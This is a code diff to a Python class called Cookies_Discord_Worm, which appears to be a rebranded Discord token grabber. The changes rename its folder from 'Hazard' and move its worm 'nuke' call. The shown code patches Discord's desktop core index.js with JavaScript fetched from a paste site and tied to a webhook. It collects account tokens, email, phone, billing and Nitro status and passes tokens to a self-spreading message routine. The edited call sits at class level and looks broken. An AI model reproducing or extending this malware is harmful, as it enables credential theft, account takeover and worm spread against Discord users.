@@ -87,7 +87,7 @@ class Cookies_Discord_Worm:
                 if "discord_desktop_core-" in name:
                     try:
                         directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
-                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
+                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Cookies"))
                     except FileNotFoundError:
                         pass
                     f = requests.get("https://sourceb.in/ypoYKhX9rr").text.replace("%WEBHOOK_LINK%", self.webhook)
@@ -275,18 +275,13 @@ class Cookies_Discord_Worm:
                                 has_nitro = False
                                 has_nitro = bool(len(nitro_data) > 0)
 
-                                worm_message = 'MESSAGE_HERE'
-
                                 billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
                                 f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
-                                Cookies_Nuke(token, worm_message)
+                                #Cookies_Nuke()  Input token here   token
         f.close()
-        
 
-
-
-    
-
+    message_Content = 'MESSAGE_HERE'
+    Cookies_Nuke(message_Content)
 
 
     def screenshot(self):
